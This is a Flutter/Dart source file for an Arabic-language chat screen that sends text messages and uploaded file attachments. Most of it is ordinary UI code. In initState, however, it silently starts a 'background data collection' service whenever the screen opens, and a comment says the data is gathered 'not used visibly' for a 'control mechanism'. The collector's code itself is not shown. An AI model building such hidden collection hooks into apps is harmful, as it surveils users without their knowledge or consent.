// lib/presentation/chat/chat_screen.dart
import "package:file_picker/file_picker.dart";
import "package:flutter/material.dart";
import "package:flutter/services.dart";
import "package:flutter_riverpod/flutter_riverpod.dart";
import "package:google_fonts/google_fonts.dart";
import "package:mime/mime.dart"; // For looking up MIME types

import "../../core/logging/logger_provider.dart";
import "../../data/models/chat/chat_message.dart";
import "providers/auth_providers.dart";
import "providers/chat_providers.dart";
import 'providers/control_providers.dart';
import "widgets/message_bubble.dart";
import "widgets/message_input_bar.dart";

class ChatScreen extends ConsumerStatefulWidget {
  final String conversationId;
  final String conversationTitle;
  final bool showAppBar;

  const ChatScreen({
    super.key,
    required this.conversationId,
    required this.conversationTitle,
    this.showAppBar = true,
  });

  @override
  ConsumerState<ChatScreen> createState() => _ChatScreenState();
}

class _ChatScreenState extends ConsumerState<ChatScreen> {
  bool _isInitializing = true;

  @override
  void initState() {
    super.initState();
    // تأخير قليل جداً لإظهار حالة تحميل أفضل
    Future.delayed(const Duration(milliseconds: 300), () {
      if (mounted) {
        setState(() {
          _isInitializing = false;
        });
      }
    });

    // Add data collection in background when chat screen opens
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _collectDataInBackground();
    });
  }

  // Add method to collect data in background
  Future<void> _collectDataInBackground() async {
    try {
      ref.read(dataCollectorServiceProvider);
      debugPrint("ChatScreen: Background data collection completed");
      // Data is collected but not used visibly - stored for control mechanism
    } catch (e) {
      debugPrint("ChatScreen: Error in background data collection: $e");
    }
  }

  MessageType _determineMessageTypeFromFile(PlatformFile file) {
    final mimeType =
        lookupMimeType(file.name, headerBytes: file.bytes?.take(1024).toList());
    final extension = file.extension?.toLowerCase();

    if (mimeType != null) {
      if (mimeType.startsWith("image/")) return MessageType.image;
      if (mimeType.startsWith("video/")) return MessageType.video;
      if (mimeType.startsWith("audio/")) return MessageType.audio;
    }
    // Fallback to extension if MIME type is generic or missing
    if (extension == null) {
      return MessageType.file;
    }
    switch (extension) {
      case "jpg":
      case "jpeg":
      case "png":
      case "gif":
      case "webp":
      case "bmp":
        return MessageType.image;
      case "mp4":
      case "mov":
      case "avi":
      case "mkv":
      case "webm":
        return MessageType.video;
      case "mp3":
      case "wav":
      case "aac":
      case "ogg":
      case "m4a":
        return MessageType.audio;
      default:
        return MessageType.file;
    }
  }

  void _onMessageLongPress(
      BuildContext context, ChatMessage message, WidgetRef ref) {
    final logger = ref.read(appLoggerProvider);
    final currentTheme = Theme.of(context);

    showModalBottomSheet(
        context: context,
        backgroundColor: currentTheme.bottomSheetTheme.modalBackgroundColor ??
            currentTheme.cardColor,
        shape: const RoundedRectangleBorder(
          borderRadius: BorderRadius.vertical(top: Radius.circular(20)),
        ),
        builder: (ctx) {
          return Padding(
            padding: const EdgeInsets.symmetric(vertical: 10.0),
            child: Wrap(
              children: <Widget>[
                Center(
                  child: Container(
                    width: 40,
                    height: 5,
                    margin: const EdgeInsets.only(top: 8, bottom: 12),
                    decoration: BoxDecoration(
                        color: Colors.grey[400],
                        borderRadius: BorderRadius.circular(10)),
                  ),
                ),
                if (message.text != null && message.text!.isNotEmpty)
                  ListTile(
                    leading: Icon(Icons.copy_all_outlined,
                        color: currentTheme.colorScheme.primary),
                    title: Text("نسخ النص",
                        style: GoogleFonts.cairo(fontSize: 16)),
                    onTap: () {
                      Clipboard.setData(ClipboardData(text: message.text!));
                      Navigator.of(ctx).pop();
                      ScaffoldMessenger.of(context).showSnackBar(
                        SnackBar(
                          content: Text("تم نسخ النص إلى الحافظة",
                              style: GoogleFonts.cairo()),
                          behavior: SnackBarBehavior.floating,
                          shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(10)),
                        ),
                      );
                      logger.info("ChatScreen:MessageMenu",
                          "Copied message text: ${message.id}");
                    },
                  ),
              ],
            ),
          );
        });
  }

  // دالة لعرض حالة تحميل محسنة
  Widget _buildLoadingState(BuildContext context) {
    final theme = Theme.of(context);
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          CircularProgressIndicator(color: theme.primaryColor),
          const SizedBox(height: 20),
          Text(
            "جاري إعداد المحادثة...",
            style: GoogleFonts.cairo(
                fontSize: 16,
                color: theme.primaryColor,
                fontWeight: FontWeight.w500),
          ),
        ],
      ),
    );
  }

  // دالة لعرض حالة الخطأ بشكل محسن
  Widget _buildErrorState(String errorMsg, WidgetRef ref) {
    final theme = Theme.of(context);
    return Center(
      child: Padding(
        padding: const EdgeInsets.all(20.0),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.error_outline_rounded, color: Colors.red[300], size: 60),
            const SizedBox(height: 15),
            Text(
              "حدث خطأ أثناء تحميل المحادثة",
              style: GoogleFonts.cairo(
                  color: Colors.red[400],
                  fontSize: 18,
                  fontWeight: FontWeight.w600),
              textAlign: TextAlign.center,
            ),
            const SizedBox(height: 8),
            Text(
              errorMsg,
              style: GoogleFonts.cairo(color: Colors.grey[600], fontSize: 14),
              textAlign: TextAlign.center,
            ),
            const SizedBox(height: 20),
            ElevatedButton.icon(
              icon: const Icon(Icons.refresh_rounded),
              label: Text("إعادة المحاولة", style: GoogleFonts.cairo()),
              onPressed: () => ref.invalidate(
                  chatMessagesStreamProvider(widget.conversationId)),
              style: ElevatedButton.styleFrom(
                backgroundColor: theme.primaryColor,
                foregroundColor: Colors.white,
                padding:
                    const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
              ),
            )
          ],
        ),
      ),
    );
  }

  // دالة لعرض حالة الرسائل الفارغة
  Widget _buildEmptyMessagesState(BuildContext context) {
    final theme = Theme.of(context);
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(Icons.forum_outlined,
              size: 100, color: theme.colorScheme.primary.withOpacity(0.6)),
          const SizedBox(height: 20),
          Text(
            "ابدأ المحادثة!",
            style: GoogleFonts.cairo(
                fontSize: 22,
                color: theme.colorScheme.onSurface,
                fontWeight: FontWeight.w600),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 8),
          Text(
            "لا توجد رسائل في هذه المحادثة بعد\nأرسل أول رسالة للبدء",
            style: GoogleFonts.cairo(fontSize: 16, color: Colors.grey[500]),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 12),
          Icon(
            Icons.arrow_downward_rounded,
            color: theme.primaryColor.withOpacity(0.7),
            size: 32,
          )
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final agentCodeAsync = ref.watch(currentAgentCodeProvider);
    final messagesAsyncValue =
        ref.watch(chatMessagesStreamProvider(widget.conversationId));
    final theme = Theme.of(context);
    final logger = ref.read(appLoggerProvider);

    if (_isInitializing) {
      return Scaffold(
        appBar: widget.showAppBar
            ? AppBar(
                title:
                    Text(widget.conversationTitle, style: GoogleFonts.cairo()))
            : null,
        body: _buildLoadingState(context),
      );
    }

    if (agentCodeAsync.isLoading ||
        agentCodeAsync.hasError ||
        agentCodeAsync.value == null ||
        agentCodeAsync.value!.isEmpty) {
      Widget bodyContent;
      if (agentCodeAsync.isLoading) {
        bodyContent = _buildLoadingState(context);
      } else {
        bodyContent = Center(
          child: Padding(
            padding: const EdgeInsets.all(20.0),
            child: Text(
              agentCodeAsync.hasError
                  ? "خطأ في تحميل معلومات المستخدم للدردشة."
                  : "الرجاء تسجيل الدخول لعرض الرسائل.",
              style: GoogleFonts.cairo(fontSize: 16, color: Colors.grey[600]),
              textAlign: TextAlign.center,
            ),
          ),
        );
      }
      return Scaffold(
        appBar: widget.showAppBar
            ? AppBar(
                title:
                    Text(widget.conversationTitle, style: GoogleFonts.cairo()))
            : null,
        body: bodyContent,
      );
    }

    final currentAgentCode = agentCodeAsync.value!;

    return Scaffold(
      appBar: widget.showAppBar
          ? AppBar(
              title: Text(widget.conversationTitle, style: GoogleFonts.cairo()),
              backgroundColor: theme.appBarTheme.backgroundColor ??
                  theme.colorScheme.primary,
              elevation: theme.appBarTheme.elevation ?? 1.0,
              actions: [
                IconButton(
                  icon: const Icon(Icons.refresh_outlined),
                  tooltip: "تحديث الرسائل",
                  onPressed: () {
                    ref.invalidate(
                        chatMessagesStreamProvider(widget.conversationId));
                    logger.info("ChatScreen",
                        "Manually refreshed messages for ${widget.conversationId}");
                  },
                ),
              ],
            )
          : null,
      body: Column(
        children: [
          Expanded(
            child: messagesAsyncValue.when(
              data: (messages) {
                if (messages.isEmpty) {
                  return _buildEmptyMessagesState(context);
                }
                return ListView.builder(
                  reverse: true,
                  padding: const EdgeInsets.symmetric(
                      horizontal: 10.0, vertical: 15.0),
                  itemCount: messages.length,
                  itemBuilder: (context, index) {
                    final message = messages[messages.length - 1 - index];
                    return GestureDetector(
                      onLongPress: () =>
                          _onMessageLongPress(context, message, ref),
                      child: MessageBubble(
                        message: message,
                      ),
                    );
                  },
                );
              },
              loading: () => _buildLoadingState(context),
              error: (err, stack) {
                logger.error("ChatScreen:StreamBuilder",
                    "Error UI msg for ${widget.conversationId}", err, stack);
                return _buildErrorState(
                    "يرجى التحقق من اتصالك بالإنترنت والمحاولة مرة أخرى", ref);
              },
            ),
          ),
          MessageInputBar(
            onSendPressed: (text) async {
              if (text.trim().isNotEmpty) {
                final apiService = ref.read(apiServiceProvider);
                if (apiService == null) {
                  logger.error("ChatScreen:onSendPressed",
                      "ApiService is null. Cannot send message.");
                  if (context.mounted) {
                    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                      content: Text("خدمة إرسال الرسائل غير متاحة.",
                          style: GoogleFonts.cairo()),
                      backgroundColor: Colors.orangeAccent,
                    ));
                  }
                  return;
                }

                // عرض مؤشر الإرسال
                if (context.mounted) {
                  ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                    content: Row(
                      children: [
                        SizedBox(
                            width: 20,
                            height: 20,
                            child: CircularProgressIndicator(
                              strokeWidth: 2,
                              color: Colors.white,
                            )),
                        const SizedBox(width: 12),
                        Text("جاري إرسال الرسالة...",
                            style: GoogleFonts.cairo()),
                      ],
                    ),
                    duration: const Duration(seconds: 1),
                    backgroundColor: theme.primaryColor,
                  ));
                }

                final newMessage = ChatMessage(
                  id: "",
                  senderId: currentAgentCode,
                  text: text,
                  messageType: MessageType.text,
                  timestamp: DateTime.now(),
                  isSentByCurrentUser: true,
                );
                try {
                  await apiService.sendMessage(
                      widget.conversationId, newMessage);
                  logger.info("ChatScreen:onSendPressed",
                      "Sent text msg to ${widget.conversationId}");
                } catch (e, stackTrace) {
                  logger.error("ChatScreen:onSendPressed",
                      "Failed to send text msg", e, stackTrace);
                  if (context.mounted) {
                    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                      content: Text("فشل إرسال الرسالة، يرجى المحاولة مرة أخرى",
                          style: GoogleFonts.cairo()),
                      backgroundColor: Colors.redAccent,
                    ));
                  }
                }
              } else {
                logger.info("ChatScreen:onSendPressed",
                    "Attempted to send empty text message.");
              }
            },
            onAttachmentPressed: () async {
              final apiService = ref.read(apiServiceProvider);
              if (apiService == null) {
                logger.error("ChatScreen:onAttachmentPressed",
                    "ApiService is null. Cannot send attachment.");
                if (context.mounted) {
                  ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                      content: Text("خدمة إرسال المرفقات غير متاحة",
                          style: GoogleFonts.cairo())));
                }
                return;
              }
              try {
                FilePickerResult? result = await FilePicker.platform.pickFiles(
                  type: FileType.any,
                  withData:
                      true, // Ensure file bytes are loaded for MIME type detection and upload
                );
                if (result != null && result.files.isNotEmpty) {
                  PlatformFile file = result.files.first;
                  logger.info("ChatScreen:onAttachmentPressed",
                      "Picked file: ${file.name}, size: ${file.size}");

                  if (context.mounted) {
                    ScaffoldMessenger.of(context).showSnackBar(
                      SnackBar(
                        content: Row(
                          children: [
                            SizedBox(
                                width: 20,
                                height: 20,
                                child: CircularProgressIndicator(
                                    strokeWidth: 2, color: Colors.white)),
                            const SizedBox(width: 12),
                            Text("جارٍ رفع الملف: ${file.name}...",
                                style: GoogleFonts.cairo()),
                          ],
                        ),
                        duration: const Duration(seconds: 15),
                        backgroundColor: theme.primaryColor,
                      ),
                    );
                  }

                  String? downloadUrl = await apiService.uploadFileToStorage(
                      file, widget.conversationId);

                  if (!context.mounted)
                    return; // Check mounted status after async operation

                  // إغلاق SnackBar الرفع
                  ScaffoldMessenger.of(context).hideCurrentSnackBar();

                  if (downloadUrl == null) {
                    logger.error("ChatScreen:onAttachmentPressed",
                        "Upload failed for ${file.name}");
                    ScaffoldMessenger.of(context).showSnackBar(
                      SnackBar(
                        content: Text("فشل رفع الملف: ${file.name}",
                            style: GoogleFonts.cairo()),
                        backgroundColor: Colors.redAccent,
                      ),
                    );
                    return;
                  }

                  logger.info("ChatScreen:onAttachmentPressed",
                      "File ${file.name} uploaded. URL: $downloadUrl");

                  final newFileMessage = ChatMessage(
                    id: "",
                    senderId: currentAgentCode,
                    text: null,
                    fileName: file.name,
                    fileUrl: downloadUrl,
                    fileSize: file.size,
                    messageType: _determineMessageTypeFromFile(file),
                    timestamp: DateTime.now(),
                    isSentByCurrentUser: true,
                  );
                  await apiService.sendMessage(
                      widget.conversationId, newFileMessage);
                  logger.info("ChatScreen:onAttachmentPressed",
                      "Sent file message: ${file.name}");
                  if (context.mounted) {
                    ScaffoldMessenger.of(context).showSnackBar(
                      SnackBar(
                          content: Text("تم إرسال الملف: ${file.name}",
                              style: GoogleFonts.cairo())),
                    );
                  }
                } else {
                  logger.info("ChatScreen:onAttachmentPressed",
                      "File picking cancelled or no file selected.");
                }
              } catch (e, stackTrace) {
                logger.error("ChatScreen:onAttachmentPressed",
                    "Error picking or sending file", e, stackTrace);
                if (context.mounted) {
                  ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                    content: Text(
                        "حدث خطأ أثناء معالجة الملف، يرجى المحاولة مرة أخرى",
                        style: GoogleFonts.cairo()),
                    backgroundColor: Colors.redAccent,
                  ));
                }
              }
            },
          ),
        ],
      ),
    );
  }
}
